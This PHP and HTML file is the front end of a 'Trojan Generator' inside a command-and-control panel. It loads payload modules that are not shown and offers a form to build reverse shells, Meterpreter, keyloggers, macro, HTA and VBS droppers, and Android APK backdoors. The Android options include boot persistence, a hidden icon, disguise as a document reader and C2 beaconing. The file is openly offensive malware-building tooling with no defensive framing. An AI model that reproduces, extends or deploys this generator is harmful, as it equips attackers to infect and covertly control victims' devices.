<?php
/**
 * COSMIC TROJAN GENERATOR – Supreme Industrial Edition
 * Lazy‑loads Android module, supports all payload types, C2 integration.
 */
$advanced_mode = isset($_GET['advanced']) ? true : false;
$preset_type   = $_GET['type'] ?? '';

// Load modules (Android only when needed)
$payload_module = null;
$android_module = null;
$module_name = '';
$is_advanced = false;

if ($advanced_mode) {
    if (file_exists(__DIR__ . '/../system/modules/AdvancedPayloadModule.php')) {
        require_once __DIR__ . '/../system/modules/AdvancedPayloadModule.php';
        if (class_exists('AdvancedPayloadModule')) {
            $payload_module = new AdvancedPayloadModule();
            $module_name = 'AdvancedPayloadModule v8.0';
            $is_advanced = true;
        }
    }
    // Android module will be lazy‑loaded later if needed
} else {
    require_once __DIR__ . '/includes/EnhancedModuleLoader.php';
    $loader = EnhancedModuleLoader::getInstance();
    if ($loader->isAvailable()) {
        if (file_exists(__DIR__ . '/../system/modules/TrojanModule.php')) {
            require_once __DIR__ . '/../system/modules/TrojanModule.php';
            $payload_module = new EnhancedTrojanModule();
            $module_name = 'EnhancedTrojanModule v2.0';
            $is_advanced = false;
        } else {
            die('TrojanModule.php not found.');
        }
    } else {
        die('Trojan module not available.');
    }
}

$generated = null;
$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['generate'])) {
    $type = $_POST['type'] ?? ($is_advanced ? 'meterpreter_reverse_tcp' : 'reverse_shell');
    
    // Lazy load AndroidTrojanModule only if Android Custom is selected
    if ($type === 'android_custom') {
        if (file_exists(__DIR__ . '/../system/modules/AndroidTrojanModule.php')) {
            require_once __DIR__ . '/../system/modules/AndroidTrojanModule.php';
            if (class_exists('AndroidTrojanModule')) {
                try {
                    $android_module = new AndroidTrojanModule();
                } catch (Exception $e) {
                    $error = "Android SDK not configured: " . $e->getMessage();
                }
            } else {
                $error = 'AndroidTrojanModule class not found.';
            }
        } else {
            $error = 'AndroidTrojanModule.php not found.';
        }
    }
    
    $cfg = [
        'type'     => $type,
        'platform' => $_POST['platform'] ?? 'linux',
        'format'   => $_POST['format'] ?? ($is_advanced && $_POST['platform'] === 'android' ? 'apk' : 'sh'),
        'lhost'    => $_POST['lhost'] ?? '127.0.0.1',
        'lport'    => (int)($_POST['lport'] ?? 4444),
        'encryption' => $_POST['encryption'] ?? 'none',
        'extra'    => [
            'c2_enabled' => isset($_POST['c2_enabled']) ? true : false,
            'obfuscation_level' => $_POST['obfuscation_level'] ?? 'medium',
            'expires_in' => isset($_POST['expires_in']) ? (int)$_POST['expires_in'] : null,
        ]
    ];

    try {
        if ($type === 'android_custom') {
            if (!$android_module) throw new Exception('AndroidTrojanModule not available.');
            $android_cfg = [
                'lhost' => $cfg['lhost'],
                'lport' => $cfg['lport'],
                'app_name' => $_POST['app_name'] ?? 'CosmicUpdate',
                'package_name' => $_POST['package_name'] ?? 'com.cosmic.update',
                'persistence' => $_POST['persistence'] ?? 'boot',
                'disguise' => isset($_POST['disguise']),
                'hide_icon' => isset($_POST['hide_icon']),
                'beacon_interval' => (int)($_POST['beacon_interval'] ?? 60),
                'use_encryption' => isset($_POST['use_encryption'])
            ];
            $generated = $android_module->generate_payload($android_cfg);
        } else {
            if (!$payload_module) throw new Exception('Payload module not available.');
            $generated = $payload_module->generate_payload($cfg);
        }
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title><?php echo $advanced_mode ? '🧬 Advanced Payload Generator v8.0' : '🏴‍☠️ Trojan Generator'; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/assets/css/cosmic-c2.css">
    <style>
        .container { max-width: 900px; margin: 0 auto; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <h1><?php echo $advanced_mode ? '🧬 Advanced Payload Generator v8.0' : '🏴‍☠️ Trojan Generator v2.0'; ?></h1>
    <div class="info"><strong>Module:</strong> <?php echo $module_name; ?><br><strong>Mode:</strong> <?php echo $advanced_mode ? 'Enterprise (HTA, BAT, VBS, Obfuscation, C2, Android)' : 'Standard'; ?></div>

    <form method="post">
        <div class="grid-2">
            <div>
                <div class="form-group"><label>LHOST:</label><input type="text" name="lhost" value="<?php echo htmlspecialchars($_POST['lhost'] ?? ''); ?>" required></div>
                <div class="form-group"><label>LPORT:</label><input type="number" name="lport" value="<?php echo htmlspecialchars($_POST['lport'] ?? '4444'); ?>" required></div>
                <div class="form-group"><label>Platform:</label><select name="platform"><option value="linux">Linux</option><option value="windows">Windows</option><?php if ($advanced_mode): ?><option value="macos">macOS</option><option value="android">Android</option><?php endif; ?></select></div>
            </div>
            <div>
                <div class="form-group"><label>Payload Type:</label><select name="type"><?php if ($advanced_mode): ?><option value="meterpreter_reverse_tcp">Meterpreter Reverse TCP</option><option value="android_backdoor_full">Android APK Backdoor</option><option value="persistence">Persistence</option><option value="keylogger">Keylogger</option><option value="word_macro">Word Macro</option><option value="pdf_embedded">PDF Embedded</option><option value="hta">HTA</option><option value="bat">Batch</option><option value="vbs">VBScript</option><option value="android_custom">📱 Android Custom</option><?php else: ?><option value="reverse_shell">Reverse Shell</option><option value="bind_shell">Bind Shell</option><?php endif; ?></select></div>
                <div class="form-group"><label>Format:</label><select name="format"><option value="sh">Shell Script (.sh)</option><option value="py">Python (.py)</option><option value="ps1">PowerShell (.ps1)</option><?php if ($advanced_mode): ?><option value="vbs">VBScript (.vbs)</option><option value="apk">APK</option><option value="docm">Word Macro</option><option value="pdf">PDF</option><option value="hta">HTA</option><option value="bat">Batch</option><?php endif; ?></select></div>
            </div>
        </div>

        <?php if ($advanced_mode): ?>
        <div class="glass-panel" style="margin-top:20px;">
            <h4>🧠 Advanced Options</h4>
            <div class="grid-2">
                <div><label>Encryption:</label><select name="encryption"><option value="none">None</option><option value="base64">Base64</option><option value="aes">AES-256</option></select></div>
                <div><label>Obfuscation:</label><select name="obfuscation_level"><option value="low">Low</option><option value="medium" selected>Medium</option><option value="high">High</option></select></div>
                <div><label>C2 Integration:</label><input type="checkbox" name="c2_enabled" value="1" checked></div>
                <div><label>Expiry (seconds):</label><input type="number" name="expires_in" placeholder="0 = never"></div>
            </div>
        </div>
        <?php endif; ?>

        <div id="android-options" style="display:none; margin-top:20px;" class="glass-panel">
            <h4>📱 Android Custom Options</h4>
            <div class="grid-2">
                <div><label>App Name:</label><input type="text" name="app_name" value="CosmicUpdate"></div>
                <div><label>Package Name:</label><input type="text" name="package_name" value="com.cosmic.update"></div>
                <div><label>Persistence:</label><select name="persistence"><option value="boot">Boot Receiver</option><option value="none">None</option></select></div>
                <div><label>Beacon Interval:</label><input type="number" name="beacon_interval" value="60"></div>
                <div><label><input type="checkbox" name="disguise" value="1"> Disguise as document reader</label></div>
                <div><label><input type="checkbox" name="hide_icon" value="1"> Hide app icon</label></div>
            </div>
        </div>

        <button type="submit" name="generate" class="btn btn-primary" style="margin-top:20px;">🚀 Generate Payload</button>
    </form>

    <?php if ($error): ?>
    <div class="result error"><h3>❌ Generation Failed</h3><pre><?php echo htmlspecialchars($error); ?></pre></div>
    <?php endif; ?>
    <?php if ($generated): ?>
    <div class="result"><h3>✅ Payload Generated</h3><p><strong>Filename:</strong> <?php echo $generated['filename']; ?></p><p><strong>Size:</strong> <?php echo $generated['size']; ?> bytes</p><p><strong>SHA256:</strong> <code><?php echo $generated['hash']['sha256']; ?></code></p><a href="<?php echo $generated['download_url']; ?>" class="btn btn-primary">💾 Download</a></div>
    <?php endif; ?>
</div>
<script>
document.querySelector('select[name="type"]').addEventListener('change', function() {
    document.getElementById('android-options').style.display = this.value === 'android_custom' ? 'block' : 'none';
});
if (document.querySelector('select[name="type"]').value === 'android_custom') document.getElementById('android-options').style.display = 'block';
</script>
</body>
</html>
